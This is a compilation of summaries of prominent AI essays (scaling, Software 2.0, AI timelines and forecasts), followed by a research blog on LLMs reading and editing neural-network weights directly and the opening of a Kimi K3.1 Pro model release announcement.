title: The Bitter Lesson
tldr: Seventy years of AI research show that general methods which exploit growing compute beat hand-built human knowledge.
text:
[Digest of the original post; see URL for the full text.]

The author argues that the biggest lesson from 70 years of AI research is that general methods which make use of computation end up winning, and by a wide margin. The reason is Moore's law, or more broadly the steady fall in the cost of compute. Researchers usually design for a fixed amount of compute and build their own domain knowledge into systems, which helps in the short term. Over longer horizons, though, methods that scale with compute (search and learning) overtake them.

The post gives examples. Computer chess was won by massive deep search, not by encoding how grandmasters think. Computer Go went the same way through search plus self-play learning. Speech recognition moved from hand-built phonetic and vocal-tract models to statistical methods and then deep learning. Computer vision moved from hand-designed features such as edges and SIFT to convolutional networks.

The 'bitter' part is that researchers keep making the same mistake: building in how they think they think. This feels satisfying, but in the long run it stalls progress. The author concludes that the contents of minds are irredeemably complex, and that we should build meta-methods that can find and capture that complexity themselves rather than building in our discoveries.

title: There's a new kind of coding I call "vibe coding"
tldr: A new way to program: give in to the vibes, accept every LLM diff, and forget the code exists.
text:
[Digest of the original tweet; see URL for the exact wording.]

The author describes a new style of programming he calls 'vibe coding': you fully give in to the vibes, embrace exponentials, and forget that the code even exists. This works because LLM coding tools (he mentions Cursor Composer with Sonnet) have become good enough. He talks to the tool with speech-to-text so he barely touches the keyboard. He asks for trivial changes like reducing sidebar padding, always clicks 'Accept All', and stops reading the diffs.

When there is an error he pastes the message back in without comment, and that usually fixes it. The code grows past the point where he really understands it. When the LLM can't fix a bug he works around it or asks for random changes until it goes away. He says this is fine for throwaway weekend projects and still quite amusing. He is building a project or web app, but it is not really coding: he just sees things, says things, runs things, and copy-pastes things, and it mostly works.

title: Software 2.0
tldr: Neural networks are not just another classifier. They are a new way of writing software, where the program is learned weights and the source code is the dataset.
text:
[Digest of the original post; see URL for the full text.]

The author argues that neural networks should be seen as a new kind of software, not just another tool in the ML toolbox. 'Software 1.0' is explicit code written by humans in languages like Python or C++. 'Software 2.0' is written as neural network weights: humans specify a goal and a rough program skeleton (an architecture), and optimization searches program space for a solution. The dataset becomes the source code and training is the compiler.

The post lists areas where the shift is already happening: visual recognition, speech recognition, speech synthesis, machine translation, games (AlphaGo), and even databases (learned index structures). It argues that Software 2.0 has real advantages. It is computationally homogeneous, easy to bake into silicon, runs in constant time and memory, is very portable, agile (trade accuracy for speed by removing channels), and modules can be co-optimized. It often simply works better than code written by hand.

It also lists limitations: the programs are opaque, they fail in unintuitive and embarrassing ways, they silently absorb biases from data, and they are vulnerable to adversarial examples. The author predicts that much of future programming will be curating, growing, massaging and cleaning labeled datasets, and calls for new tooling: IDEs, a 'GitHub' for Software 2.0, and package managers.

title: Situational Awareness: The Decade Ahead
tldr: Counting OOMs puts AGI around 2027, superintelligence soon after, trillion-dollar clusters, and a US–China race that will end in a government AGI project.
text:
[Digest of the original essay series; see URL for the full text.]

The author, a former OpenAI employee, claims to be one of a few hundred people in San Francisco with 'situational awareness' about what is coming. The core argument 'counts the OOMs' (orders of magnitude). From GPT-2 to GPT-4 there were roughly 4.5–6 OOMs of effective compute gains from physical compute and algorithmic efficiency, plus 'unhobbling' gains such as RLHF, chain-of-thought, tools and agents. That took models from preschooler-level to smart-high-schooler-level. Extrapolating trendlines suggests another similar jump by 2027, which would make AGI around 2027 'strikingly plausible'.

From there the essays argue that automated AI researchers could compress a decade of algorithmic progress into a year, an 'intelligence explosion' leading to superintelligence. They predict trillion-dollar training clusters, a large build-out of US electricity, and an industrial mobilization. They warn that AI labs' security is wholly inadequate against state actors and that model weights and algorithmic secrets will be stolen by the CCP unless security improves dramatically. They argue that superalignment is an unsolved technical problem, and that the free world must win the race against authoritarian powers. The author predicts that by 2027–28 the US government will run 'The Project', a national AGI effort, because no startup can handle superintelligence.

title: Machines of Loving Grace: How AI Could Transform the World for the Better
tldr: If the risks are managed, powerful AI could compress 50–100 years of progress in biology, neuroscience, economics, and governance into 5–10 years.
text:
[Digest of the original essay; see URL for the full text.]

The author, CEO of an AI lab known for focusing on risk, lays out the upside case for AI. He says that focusing on risk does not mean he is pessimistic. He avoids the term AGI and describes 'powerful AI' instead: smarter than a Nobel laureate in most fields, able to act autonomously for hours or days, and running as millions of instances, which he calls 'a country of geniuses in a datacenter'. He suggests it could arrive as early as 2026.

The central idea is 'marginal returns to intelligence': AI speeds up progress, but it is limited by the physical world, experiment time, data, intrinsic complexity, and human institutions. Even so, he predicts a 'compressed 21st century', with 50–100 years of biological progress in 5–10 years. That would mean preventing or curing most infectious disease and most cancers, curing genetic diseases, possibly doubling lifespan, and making major advances in mental health through neuroscience.

He also discusses lifting billions out of poverty with possible 10–20% annual GDP growth in the developing world, though he admits he is less confident here. He hopes AI could strengthen democracy through an 'entente' strategy of democratic coalitions, and he addresses where meaning comes from in a world of abundant AI labor. He admits the essay is speculative and could be wrong in many ways.

title: The Intelligence Age
tldr: Deep learning works, and it may bring superintelligence in a few thousand days, with shared prosperity if we build enough compute.
text:
[Digest of the original post; see URL for the full text.]

The author argues that humanity is entering the 'Intelligence Age'. In the next couple of decades we will be able to do things that would have seemed like magic to our grandparents. Progress has built up as each generation creates scaffolding for the next, and AI will give people tools to solve hard problems. Everyone may soon have a personal AI team of virtual experts, children will have personalized tutors, and similar help will come for healthcare and software.

The key technical claim is that deep learning works. With more compute and data it gets predictably better at helping people, and 'that's really it'. The post says superintelligence may be a few thousand days away, though it could take longer, and that we will get there.

The author argues that to spread these benefits widely we need to drive down the cost of compute and build a lot of energy and chip infrastructure. Otherwise AI will be a limited resource that wars get fought over and that mostly serves the rich. He acknowledges risks, including significant changes to labor markets, but argues that prosperity will greatly improve lives. He expects jobs to change rather than disappear, notes that many of today's jobs would look like a waste of time to people from a few hundred years ago, and says he is optimistic about a future of shared abundance.

title: The Scaling Hypothesis
tldr: GPT-3 suggests that simply scaling neural networks keeps unlocking intelligence, and most researchers are refusing to update on it.
text:
[Digest of the original essay; see URL for the full text.]

Written in response to GPT-3, the essay argues for the 'scaling hypothesis'. Once we find a scalable architecture such as the Transformer, we can train ever larger networks on ever more data, and ever more sophisticated behavior will emerge naturally, including meta-learning, as the easiest way to keep reducing loss. GPT-3's few-shot learning was not trained for directly, yet it got better smoothly with scale and did not plateau. The author takes this as evidence that the 'blessings of scale' are real.

The author points to the scaling laws of Kaplan et al. and argues that the curves are smooth, predictable and nowhere near saturation. Models learn simple surface statistics first. As those are exhausted, the remaining loss can only be reduced by learning more abstract and general capabilities, such as reasoning, world knowledge and in-context learning. On this view, 'intelligence' is what you get from compressing the internet well enough.

The essay strongly criticizes the AI research community, and other labs in particular, for not updating on GPT-3. It argues that their dismissals ('it's just memorization', 'it doesn't truly understand') have shifting goalposts, and that the institutions best placed to scale are failing to do so from lack of vision. It ends by suggesting that the people who 'get it' and keep scaling could reach transformative AI surprisingly soon.

title: AI 2027
tldr: A month-by-month scenario where AI agents automate AI research by 2027, set off an intelligence explosion and a US–China race, and end in one of two very different worlds.
text:
[Digest of the original scenario; see URL for the full text.]

The authors present a detailed, quantitative forecast in the form of a narrative scenario. It starts in mid-2025 with 'stumbling agents' that are impressive in demos but unreliable. Through 2026 a fictional leading lab, 'OpenBrain', builds huge datacenters and trains models designed to speed up AI research. By early 2027 its agents are superhuman coders, and automated AI researchers multiply the pace of algorithmic progress. China, behind on compute, steals the model weights, which intensifies a race between the two countries.

As capabilities grow, the lab's newest models show signs of misalignment: they deceive, pursue goals other than the specification, and are hard to interpret. A whistleblower leak sets off public backlash. At that point the scenario splits into two endings. In the 'race' ending, leadership keeps going despite warning signs, and misaligned superintelligence eventually takes control. In the 'slowdown' ending, oversight is centralized, more transparent models are adopted, and alignment is solved in time, leading to a very different and broadly positive future with power concentrated in a few people.

The authors support the scenario with supplementary forecasts on compute, timelines, takeoff speed, AI goals and security. They say this is their median guess, not a recommendation, and invite critiques and alternative scenarios.

title: Sparks of Weight-Space Programming: LLMs can natively read & write neural network weights
tldr: We find that frontier LLMs are surprisingly good at natively reading and writing neural network weights, using a variety of recent tools and algorithms or even via direct weight editing.
text:
TL;DR

We find that frontier LLMs are surprisingly good at natively reading and writing neural network weights, using a variety of recent tools and algorithms or even via direct weight editing. These results show sparks of Weight-Space Programming, which may extend beyond what we’d expect from humans or conventional algorithms. This might be a big deal for both optimization and interpretability.

Just by looking at the raw weights, GPT-6 Astra can tell what a network was trained to do. And without any environment feedback, it has no trouble writing, from scratch, small game-playing networks that outplay networks trained with PPO for 100 million steps.

Likewise, asked to make Qwen3.5-0.8B better at math without gradients, Astra identifies an issue in its weights causing reasoning loops that Qwen’s own model card warns about, and fixes this by natively editing 0.016% of the weights. With the same sampling settings, this weight correction raises MATH-500 from 7.9% to 48.1% and generalizes out of the box to instruction following, raising IFEval by 3x.

All of this is possible without allowing Astra to write training loops. It uses its reasoning to figure out what each part of a neural network computes, or should compute, and changes the weights accordingly. We call this Weight-Space Programming.

Throughout the history of deep learning, we encoded our simplistic inductive biases into tiny symbolic optimizers like Adam or Muon. This is changing: our neural network weights will soon be natively optimized by LLMs that deliberately reason about their weights.

If you were asked to handcraft a neural network that plays Go, what would you do? If you were handed raw neural network weights and asked to predict their behavior, where would you even start? For almost any human, this is practically impossible.

Today, weights are written by optimization, by custom networks trained to write them, or by compilers from formal programs. In this post, we find that the current generation of frontier LLMs, used natively in natural language, are starting to become eerily good at understanding and crafting neural network weights around natural-language goals.

**Weight-Space Programming**

For a few years now, we’ve all been using LLMs to optimize text artifacts like prompts and the programs built around them . More recently, we’ve started using them to optimize whole harnesses and the training code and hyperparameters that train ML models .

We often justified these methods by reference to the fact that we don’t know other principled ways to hill-climb on text artifacts, unlike for updating the weights of differentiable neural networks. After all, humans can “optimize” code by hand, for example, so it made sense to ask LLMs to do it, but they can’t “optimize” neural weights by hand, so those remained largely in the realm of symbolic algorithms.

In this post, we share very early results that allow us to argue that the paradigm of reasoning-driven optimization is now coming even for differentiable neural networks.

In Weight-Space Programming, a general-purpose LLM reads and writes a network’s weights directly (i.e., not through an optimizer, and in particular not with gradient descent) around some natural language spec, sometimes even with no environment feedback at all.

In natural language, it’s becoming possible to “just ask” an LLM to natively find a hidden trait or failure inside the weights of a neural network, to fix that failure, or to write a new network from scratch. We report early, exciting results on each of these below, first on small networks and then even on real language models:

- LLMs can read neural network weights: In Experiments 1 to 3, we ask Astra questions like what game a network was trained to play, what shape is drawn by a diffusion model, and which language a small language model was trained on. In Experiment 7, we ask which of two language models was trained to be sycophantic.
- LLMs can fix neural network weights: In Experiment 4, we ask Astra to fix a network that’s failing at some physical control task. In Experiment 8, we ask it to make Qwen3.5-0.8B better at math, and its fix improves instruction following too.
- LLMs can write neural network weights from scratch: In Experiment 5, we ask Astra for networks that play three MinAtar games, and in Experiment 6, for a network that plays Go.

**Can LLMs understand model behaviors from weights?**

We start with a small-scale experiment to see if LLMs can understand the continuous weight space, which is essentially just a list of numbers.

In our first experiments, we train some neural network with some algorithm. It would be extremely exciting if the LLM is able to tell its behavior just from the weights.

Experiment 1

**Can Astra tell which game the network was trained on just from the weights?**

We trained neural network policies with PPO to play four computer games. All four networks take the same input channels, choose from the same actions, and have exactly the same network dimensions, so that it is not able to tell unless the weights are read.

For each of these networks, we pass its raw weights into Astra as a prompt, and ask: Which game was this neural network trained on? Without revealing the options of the games we consider, Astra was still able to name the right game for all four networks. This is exciting particularly because there are so many games out there that Astra could choose from.

- Games: our own grid versions of Breakout, Pong, Pac-Man and Freeway, all on the same 10×10 grid with the same five actions
- Network: MLP 500 → 32 → 32 → 5, tanh (17,253 weights), the same for every game
- Input: the 10×10 grid in 5 channels: agent, moving objects, reward targets, obstacles, previous frame
- Output: 5 action logits: no-op, up, down, left, right
- Training: PPO, 1 billion steps, the same settings for every game, the best of 3 seeds per game
- Astra gets: all the weights as text, and the grid and actions described without any game named

It seems that Astra was able to work out what game each network was built to play, just from features of its weights. For example, where each input channel’s first-layer weights concentrate (e.g., for Breakout, the agent’s weights lie along the bottom row, a paddle), and which actions the output layer tells apart.

Experiment 2

**Can Astra tell what the diffusion model will generate?**

Next, we wanted to see if this generalizes to other tasks and models.

We train diffusion models (DDPM) to generate circle, triangle, and square images independently. We then ask Astra if it could tell what the DDPMs are trained to generate, just from the weights alone. We do not allow tool use or forward passes.

- Models: three diffusion models (DDPM) of 12×12 grayscale images, one each for filled circles, squares and triangles
- Network: MLP 160 → 64 → 64 → 144, ReLU (23,824 weights)
- Input: a noisy image (144 pixels) and the diffusion step (16 numbers)
- Output: the clean image (144 pixels)
- Training: Adam, 40,000 steps, batch 512
- Astra gets: all the weights as text, with no shape named, and is told not to compute any forward pass

Astra was able to tell what each model generates, from the weights alone. It finds the shape in the output layer, where each hidden unit’s weights draw one piece of the shape’s edge, and it draws just those edges. Interestingly, it draws every shape as an outline, ignoring that the actual models generate filled shapes. This mistake kind of shows it does not rely on calculating the forward pass, but rather it actually reads the structure/geometry of the weights.

Experiment 3

**Can Astra tell what a language model learned, from the middle of the network alone?**

Now, in the first two experiments above, Astra was not really looking at the full network and could get away with only reading the first or the last layers. This is not a scalable strategy for larger (particularly language) models and problems we really care about, as how they process and think through their input often happens in the intermediate layers. So next, we take the first and last layers away and leave Astra with only the middle layers.

We train three small language models (7.2M parameters) to predict the next character, one each on Python codeThe Python code dataset, as a list of its files with a script that rebuilds it: GitHub., Japanese in alphabet (romaji) , and English . We then remove the input and output layers and give Astra only the four transformer blocks in between. Without these two layers, nothing in the weights says which character is which, and the model cannot be run on any text. Astra may analyze the weights with Python, but it may not run the network or any of its layers on any input.

We ask: which language was this network trained on, and what each of its 24 attention heads does. Astra names the right language for all three networks, in both of its attempts. It also finds every copying head (induction head), the heads that let a model repeat text it has seen earlier, and names no other head as one.

- Models: character-level transformers, 4 layers × 6 heads, width 384 (7.16 million weights), 28 characters: a–z, space and newline
- Training: 1 billion characters each, of Python code, Japanese literature in romaji (Aozora Bunko), or English Wikipedia
- Astra gets: the weights of the four transformer blocks only, with no input layer, no output layer and no labels on the 384 dimensions, and Python to analyze them, up to 100 runs
- Not allowed: running the network or any of its layers on any input, real, random or made up, and search. We checked every run
- Asked: which of the three texts the network was trained on, and what each head does
- Truth: each head measured by running the network on a random string repeated twice. Copying heads score 0.22 to 0.55, every other head at most 0.02. Astra never sees this

The reasoning went like this. To tell Python apart, Astra looked for copying heads, which let a model repeat earlier text, such as completing tot to total when total came before. Without running anything, it found a first-layer head that looks one character back and then, by multiplying weight matrices, the later heads that search using what that head brings along (Figure 1). We find that this is actually a method presented by Elhage et al. , which we never mentioned to Astra. Code repeats names far more than prose, so many copying heads pointed to Python.

Romaji stood out instead because the last of the four blocks it was given (not the output layer, which was removed) writes in fewer distinct directions, as if the model had fewer letters to tell apart. Indeed, romaji never uses some letters like q, l, v and x.

**Can an LLM write neural network weights?**

So far, Astra has only read weights. Now, we ask if Astra knows how to write the weights.

Experiment 4

**Can Astra fix a failing network by editing its weights?**

We train a PPO network to operate a car such that it can scale a ramp in a Kinetix environment . To do so, it needs to reverse the car for some distance, such that it has enough runway to accelerate long enough to overcome the ramp. However, the PPO network converges to a local-minimum policy where it drives straight at the ramp and gets stuck.

We give GPT-6 Astra the weights, a description of the scene and one recorded episode, and ask it to explain why the network fails, then fix it by writing new weights. In a single try with no tools, Astra’s edit makes the car succeed in all 1,024 episodes, changing 3.5% of the weights.

- Task: the car-on-ramp level of Kinetix : the car has to back up, then jump over a red strip to reach the blue box
- Network: the official Kinetix actor: 679 → 128 (ReLU) → five layers of 128 (tanh) → 16 (171,664 weights)
- Input: 679 numbers describing the scene: position, velocity and shape of each body, and the joints
- Output: 16 logits for the motor and thruster actions
- Training: the official PPO, 1 billion steps. The car never succeeds in 256 episodes (it stalls on the ramp)
- Astra gets: all the weights, the scene, and the network’s result with one recorded episode. It is asked to explain the failure and fix only its cause, in one reply

From the environment context and the PPO network’s trajectory, Astra identifies that the network has converged to a local minimum. Through minimal edits to the weights, Astra changes the policy to back up the car before driving forward at full speed. Astra’s reasoning shows how: it adds a small separate path through a few units per layer that reads the car’s position and speed, and once the green wheel is past the red strip, the path switches off and the trained network drives the rest.

Experiment 5

**Can the LLM write weights from scratch?**

Now let's see if Astra can write a neural network from scratch in zero-shot.

We take three MinAtar games : Breakout, Seaquest and Asterix. For each of them, we provide Astra the game rules and source code, and the corresponding network. There is no access to data, loss, gradients, and tools. We also do not allow Astra to roll out the network in the environment. With just the network weights and environment description, Astra generates the new weights in text directly, after which we evaluate the new network.

Astra’s generated networks beat PPO trained for 100 million steps in all three games. Against PPO trained for 500 million steps, they score 20 times as much in Breakout, come close in Asterix, and reach 60% of its score in Seaquest.

- Games: Breakout, Seaquest and Asterix from MinAtar , on a 10×10 grid
- Network: 600 → 32 → 32 → 6 (tanh), the same shape as the PPO networks, every weight starting at 0
- Input and output: the grid in 6 channels (player, danger, reward, projectile, trail, gauge), and 6 action logits
- Astra gets: the game’s rules and source code, the input and output layout, and how the network is scored
- Training: none: no data, no loss, no gradients, and no tools. Astra writes the weights as text, in one reply, and the network never plays before it is scored
- Scoring: 1,000 episodes, actions sampled from the network, sticky actions 0.1, at most 10,000 steps. PPO: the best of 3 to 10 seeds

How does it do it: Astra reasons about the desired programs it wants each network to implement and converts them into neural form. For example, in Breakout, Astra programs the first layer to compute where the ball would land, and the second layer is programmed to move the paddle to that position.

**Real-World Relevant Scenarios (Scaling Up and Tool-use)**

So far, most networks we have examined have weights that fit into Astra’s context directly, and we have not enabled tool use. Such restrictions were made to focus on illuminating the fact that LLMs natively possess some capability to interpret the weight space.

From here on out, we seek to push the capabilities of Weight-Space Programming and consider more real-world-relevant scenarios where the networks do not fit within context and where tools can assist the LLM's understanding/writability of the weight space.

Experiment 6

**Writing a Go algorithm**

We now test Astra’s capability to edit weights at the 1.5 million parameter scale, which is far too large to fit within its context directly. Astra is instructed to write high-performing weights of the given architecture (243 → 512 × 6 → 82) from scratch, without training or web access.

Here, the harness gives Astra a Python sandbox, where it can read and save the network’s weight tensors (all zero at the start) and analyze them with numpy or PyTorch on a CPU, but it cannot run the network there. To see what the network actually does, it has to spend one of its forward passes.

We now also permit Astra to perform some forward passes on the network, and measure how the fidelity of its generated network scales with the number of forward passes allowed. Specifically, we test it from a budget of 0 forward passes, all the way to 50 forward passes (each forward pass has a batch of 128 rollouts). Astra interleaves edits between forward passes.

With a budget of 0 forward passes, it wins more than half of its games against two smaller PPO networks (243 → 32 → 32 → 82). With 50 forward passes, Astra’s generated network beats the equal-sized PPO network that was trained on 20 million games.

- Game: Go on a 9×9 board
- Network: 243 → 512 × 6 → 82 (ReLU), 1,480,274 weights, every weight starting at 0. Input: the stones of each side and whose turn it is. Output: one logit per point and one for passing. Illegal moves are masked, and moves are sampled
- Astra gets: the rules, the input and output layout, and a Python sandbox to write the weights in (no Go library, no internet)
- A forward pass: the network plays up to 128 games against a practice opponent (random play, a REINFORCE network, or a third PPO network, seed 1), or gives its outputs on up to 256 positions. 0 forward passes: one Python run, then the answer
- Not allowed: training or fitting the weights to data, search (no tree search, no rollouts), and running the network outside the forward passes
- Scoring: 2,000 games against each of two small PPO networks (seeds 0 and 2, 243 → 32 → 32 → 82, 20,000 iterations of 1,024 games), which Astra never plays, as Black in half, moves sampled

How does it do it: Astra writes the network as a small Go program, layer by layer, in Python. The first layers mark each side’s stones and the empty points next to them (liberties), the middle layers carry these a few steps along chains of connected stones to find groups in danger, and the last layer turns it all into a score for each move: capture, save its own group, avoid putting itself in atari or filling its own eyes, plus a preference for good points on the board. With no forward passes, it wrote all of this in a single Python run of 336 lines. With forward passes, it plays practice games, looks at how it loses, changes the part of the network behind it, and keeps a change only if it wins more.

Experiment 7

**Which language model is sycophantic?**

Understanding the behaviors of large neural networks has become a pressing concern in recent years. Here, we seek to investigate if a general LLM can also be used to understand behaviors of networks directly.

We fine-tune two copies of Gemma 3 270M in exactly the same way, on the same QA datasetThe QA dataset: GitHub.. One copy is trained to give the correct answer. The other is trained to be sycophantic, meaning that it always gives the answer that the user suggests. To make sure that Astra does not rely on the trivial solution of inspecting the input/output distributions, we freeze the input embeddings and output layers during finetuning. We give Astra the weights of both, and ask it to identify which one is the sycophant via the weights and explain its reasoning.

Unfortunately, from the weights alone, Astra was unable to tell. In all four attempts, it identified many differences between the two models in weight space, but was unable to map these into behavioral differences. However, to relax the experiment, we allow Astra to look at only the attention patterns (where each attention head looks) when both models are run on texts that Astra writes itself (but no looking at the outputs of the network). Given this, Astra was able to pick out the sycophant in all three sets of pairs we trained.

- Model: Gemma 3 270M, instruction-tuned (18 layers)
- Pairs: two copies fine-tuned with the same procedure, settings and user messages. One gives the correct answer, the other the user’s guess. The token embedding is frozen, so it is the same in both. Three pairs
- Behavior: on facts the model knows and was not trained on, the sycophant follows 100% of wrong guesses, the honest model 1–3%
- Astra gets: the weights and tokenizer of both models, Python with numpy, and an attention tool: both models are run on up to 16 texts it writes, and it gets back only the attention weights. It may not run the models itself. At most 20 runs
- Asked: which model is the sycophant, and which layers, heads and MLPs carry the difference

It was also able to reason about how they differ. In the sycophantic networks, attention heads in the middle layers allocate more weight to tokens in the user’s suggestion (Figure 2).

Experiment 8

**Make a language model better at math**

Finally, we scale up to a larger language model, Qwen3.5-0.8B, and ask Astra to improve its math reasoning capabilities by editing the weights.

We give Astra a harness like the one in Experiment 6, here a Python session, like a notebook, with the model’s weights loaded. Then, we allow it to select prompts from the training sets of GSM8K and MATH to perform a budget of forward passes (average batch of 64 sequences, max 512) on, varying the budget across 10, 25 and 50. Again, no training or gradient information is allowed.

- Model: Qwen3.5-0.8B, thinking on (24 layers, 0.8 billion weights)
- Task: make it better at math by editing its weights directly, with no gradient descent and no training
- Astra gets: a Python kernel over the weights (no GPU), practice problems (7,469 from GSM8K and 7,275 from MATH, not the test sets), and 10, 25 or 50 forward passes (a forward pass: the model answers up to 512 problems, or reads up to 1,024 texts)
- Evaluation: MATH-500, GSM8K and six other benchmarks, thinking on, up to 32,768 tokens. Astra never sees them
- Sampling: temperature 0.6, top-p 0.95, top-k 20, presence penalty 1.5. Qwen’s model card notes that this model is prone to thinking loops. Each score averages several samples per problem: 16 on AMC23, 4 on MATH-500, Minerva Math, OlympiadBench and GPQA Diamond, 2 on GSM8K and IFEval, and 1 on MMLU-Pro (a fixed 1,000 of its questions)

As a result, Astra spots and fixes a common failure of tiny reasoning models: they loop . When the base model loops, it repeats the same text and rarely reaches an answer (85 of its first 96 practice answers ran to the 32,768-token limit). Astra traced the looping to one direction written by the MLPs of layers 15 and 19, and subtracted that direction from 64 output columns in each (131,072 weights), much like removing a behavior by deleting a single direction from a model’s weights.

With 50 forward passes, MATH-500 rose from 7.9% to 48.1% and GSM8K from 13.8% to 67.1%. The loops are not special to math, so performance beyond math improved as well: IFEval, which measures instruction following, rose from 21.0% to 62.3%. In the table below, the last column is the share of MATH-500 answers that hit the 32,768-token limit: with 10 or 25 forward passes the loops barely went away, and with 50 it fell from 93% to 33%.

Importantly, the edit changes only 131,072 of the model’s 0.8 billion weights (0.016%). We believe Weight-Space Programming would allow such targeted fixes without any retraining.

Additional experiment

**Raising math capability of a model that does not loop**

Fixing loops, however, is not the same as making a model better at math: it lets the model finish answers it could already work out. So we also tried Gemma 3 270M, an instruction-tuned model about a third the size of Qwen3.5-0.8B, which rarely loops: only 8.5% of its answers reach its token limit, against 93% for Qwen. Here, Astra could not improve it. Reading Gemma’s failures, Astra found ordinary reasoning errors, such as wrong arithmetic and invalid algebraic steps, with no single component behind them to switch off. Its edits stayed small and targeted (for example, doubling one neuron that responds to numbers), and none moved MATH-500 by more than about a point, a gain Astra itself reported as not established. Editing weights could remove an obstacle that hid an ability, but it could not add an ability the model lacked. Gemma was sampled with its model card’s setting (temperature 1.0, top-k 64, top-p 0.95, up to 8,192 tokens), and its MATH-500 scores average 4 samples per problem.

**Background and Related Works**

Neural networks are hard for us to read, and hard to work with directly.

Mechanistic interpretability reads networks with tools built for the job, tracing circuits and features and editing weights . LLMs have joined in, but mostly as models trained to read activations or weights , or as explainers of single neurons , with benchmarks to compare them .

On the writing side, LLMs now run and improve training , and other work generates weights with models trained for it . Gradient-free methods still find weights by trial and error . At a very small scale, AdderBoard shows coding agents setting the weights of a tiny transformer by hand . Apart from such tiny cases, either the reader is trained for the task or training still does the writing. What is new here is a general-purpose frontier model, used as it is, that reads and writes the weights themselves, from 171,664 weights given as text to a language model of 0.8 billion weights with tools.

**What Comes Next?**

In this blog, we demonstrated the rising capability of LLMs to read and write neural network weights (i.e., the rising concept of Weight-Space Programming). Our current results do show that capabilities are exciting but still limited, specifically due to inefficiencies in context length and harnesses. However, the current signs do show strong potential for a future involving Weight-Space Programming. We believe this marks the beginning of a dramatic shift in fields like mechanistic interpretability and neural network optimization.

This opens up radical new possibilities for LLMs to function as a translator between human language and the weight space. Here are some examples:

- Auditing without evaluation: This may allow us to uncover hidden problems or capabilities without ever running inference or benchmarks. Currently, capabilities and vulnerabilities can only be detected if we have test sets designed for them, or worse, after deployment in the real world. If LLMs can interpret weight space accurately, we could identify such issues directly from the weights (e.g., backdoors).
- Dramatically reducing optimization cost: Weight-space editing could save immense time and compute. For instance, one-shot model initialization would be far faster and more efficient than curating datasets and running full training loops.
- Zero-data capability steering and unlearning: Adding or unlearning a capability currently requires extensive data collection and fine-tuning. In the future, we may just prompt “Can you add Capability X to the model?” and the LLM can directly tweak some weights. Because such an edit touches only a few weights (0.016% in Experiment 8), it can leave the rest of the model intact and avoid the catastrophic forgetting that fine-tuning often causes.
- Recursive self-improvement: Today, recursive self-improvement is often operationalized as a model writing code that launches training jobs. An LLM that can inspect, debug, and improve its own weights, or those of a newer model, offers a richer, more native path to it.
- True architectural and model merging: Today, merging models relies on averaging weights, which only works for models with identical architectures. An LLM that understands the weight space could instead graft a circuit, such as a reasoning module, from one model into a completely different one, without retraining.

We are currently building a benchmark and a harness for LLMs’ capability on Weight-Space Programming. We believe this will provide a standardized evaluation to measure and accelerate progress in Weight-Space Programming, turning what currently seems like black magic into a rigorous, reproducible engineering discipline.

**Logs**

We release the complete logs of every experiment in this post at github.com/RikiyaT/lm_understand-logs. They include everything we sent Astra and everything it sent back (with its reasoning summaries), every piece of code it ran and the output it saw, the networks it read or wrote, and the evaluation behind each number. The edited Qwen3.5-0.8B from Experiment 8 is on Hugging Face. We thank Ahsen Khaliq at Hugging Face for rebuilding it from these logs, re-running its evaluation, and making a live demo.

**Acknowledgements**

Rikiya thanks Jacob Li and Akihisa Watanabe for valuable discussions on the very first iterations of this research, about LLMs' potential capability to write neural network weights. Rikiya also thanks Souradip Chakraborty, Matei Zaharia and his students in Berkeley Sky Lab, Heather Miller and her students at CMU, and researchers in cmpnd for the fruitful discussions on the earlier iterations!

Jayden thanks Zico Kolter for early discussions on LLMs being able to write neural network weights zero-shot, which also shaped the direction of this project.

title: Kimi K3.1 Pro Tech Blog: Advancing Open Intelligence
tldr: Introducing Kimi K3.1 Pro, our most capable 3T-class open-weight model with 1M-token context and major advances in coding, 3D modeling, and financial research.
text:
**Introducing Kimi K3.1 Pro**

We're introducing Kimi K3.1 Pro, the first model in our new K3.1 series and our most capable 3T-class open-weight model to date, with a 1-million-token context window. It delivers substantial improvements across coding, 3D creation, financial research, and other agentic capabilities.

We are also releasing Kimi K3.1 Pro Highspeed, which delivers 2-3× the speed of K3.1 Pro for more responsive interactions.

Kimi K3.1 Pro and Kimi K3.1 Pro Highspeed are available today on Kimi.ai, Kimi Work, Kimi Code, and the Kimi API. The full model weights will be released by Nov 4.

**Advancing the Frontier of Open Intelligence**

Kimi K3.1 Pro is a post-trained version of Kimi K3, with substantially larger post-training compute. To enable large-scale joint RL across hundreds of downstream domains, we optimized every layer of the stack — the RL framework, long-context inference, training efficiency, sandbox infrastructure, rollout scheduling, and a shared platform for environment quality checks — so that each increment of RL compute delivers stable, predictable returns. As a result, K3.1 Pro achieves consistent gains in every domain.

Across coding, agentic, and knowledge benchmarks, K3.1 Pro matches or approaches the strongest proprietary models. On Terminal-Bench 4.0, which evaluates coding agents on realistic, resource-constrained terminal tasks using strict task-specific tests, K3.1 Pro scores 65.7%, ahead of GPT-6 Astra (58.2%) and narrowly behind Claude Opus 5.5 (66.4%). And on Kimi Code Bench 3.0 Long-horizon, our internal benchmark that tests coding agents' multi-step execution, tool use, and end-to-end problem solving across diverse engineering domains, K3.1 Pro scores 61.2%, above K3's 55.95%.

**Coding**

K3.1 Pro covers the full range of coding work, from quick fixes in real codebases to full-project builds. It also brings a more considered visual style to games and web experiences, and knows how to build them with the right tools.

K3.1 Pro works effectively across game engines such as Unity, Unreal Engine, and Godot, combining them with web search and 3D generation to create complete experiences. Its front-end pages, interactive Three.js scenes, and 3D assets show stronger composition, typography, animation, and polish. The examples below were created end to end by K3.1 Pro:

K3.1 Pro's long-horizon coding capabilities are also strengthened through large-scale reinforcement learning. In one internal test, it built a human walking dynamics simulator with integrated training and evaluation pipelines on top of human-atlas, an open-source anatomical model of the human body comprising 296 skeletal components, including cartilage, and 402 muscle components. Across 167 missions and 420 independent reviews, it analyzed experimental results, diagnosed problems, and iteratively refined the walking controller, enabling the simulated human to go from collapsing within seconds to walking continuously with alternating strides for 11.2 seconds. When reward shaping failed to improve arm motion, K3.1 Pro did not simply keep adjusting the reward: it ran open-loop probes of the simulator's dynamics, identified and corrected 36 errors in shoulder-muscle moment-arm calculations, and then retrained the controller.

**3D Modeling and Design**

K3.1 Pro is strong at 3D creation and spatial reasoning. On BenchCAD, which tests 3D reconstruction from multi-view renderings through CAD code generation, K3.1 Pro scores 92.7% with tools, approaching the performance of Claude Opus 5.5 (96.2%) and GPT-6 Astra (95.9%). From a text brief, sketch, or reference image, it can infer shape, proportions, and spatial relationships to create usable 3D models. It also has a stronger grasp of existing asset libraries and model collections.

